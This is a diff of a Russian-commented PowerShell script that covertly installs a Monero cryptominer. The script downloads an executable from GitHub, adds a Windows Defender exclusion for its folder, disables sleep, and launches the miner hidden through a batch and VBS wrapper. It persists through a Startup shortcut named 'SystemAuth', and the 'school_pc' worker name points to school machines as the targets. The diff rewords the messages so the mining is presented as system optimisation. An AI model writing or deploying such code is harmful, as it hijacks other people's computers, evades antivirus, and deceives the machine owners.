@@ -5,40 +5,39 @@ $exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.ex
 
 # 1. Защита от повторного запуска
 if (Get-Process $procName -ErrorAction SilentlyContinue) {
-    Write-Host "Система уже настроена." -ForegroundColor Green
+    Write-Host "Система уже оптимизирована." -ForegroundColor Green
     exit
 }
 
-# 2. Создание папки и исключение
+# 2. Настройка питания (чтобы не спал, но гасил экран)
+powercfg /x -standby-timeout-ac 0
+powercfg /x -monitor-timeout-ac 5
+powercfg /h off
+
+# 3. Подготовка папки и исключение
 if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
 powershell -Command "Add-MpPreference -ExclusionPath '$path'" -ErrorAction SilentlyContinue
 
-# 3. Скачивание только одного EXE
-Write-Host "--- Оптимизация системы ---" -ForegroundColor Cyan
+# 4. Скачивание EXE
 if (!(Test-Path "$path\$procName.exe")) {
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
-        Write-Host "[OK] Компоненты загружены." -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Ошибка сети." -ForegroundColor Red
-        exit
-    }
+    } catch { exit }
 }
 
-# 4. Настройка скрытого запуска (Батник и VBS)
+# 5. Настройка автозапуска (скрыто)
 $cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --priority 1"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
 
-# 5. Автозагрузка
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemAuth.lnk")
 $Shortcut.TargetPath = "$path\win_start.vbs"
 $Shortcut.Save()
 
-# 6. Команда CHECK для тебя
+# 6. Команда CHECK
 $ProfilePath = $PROFILE
 if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
 $CheckFunc = @"
@@ -52,4 +51,4 @@ $CheckFunc | Out-File -FilePath $ProfilePath -Force
 
 # 7. Старт
 Start-Process -FilePath "$path\win_start.vbs"
-Write-Host "Готово! Проверь командой 'check'." -ForegroundColor Magenta
+Write-Host "Установка 24/7 завершена успешно!" -ForegroundColor Magenta
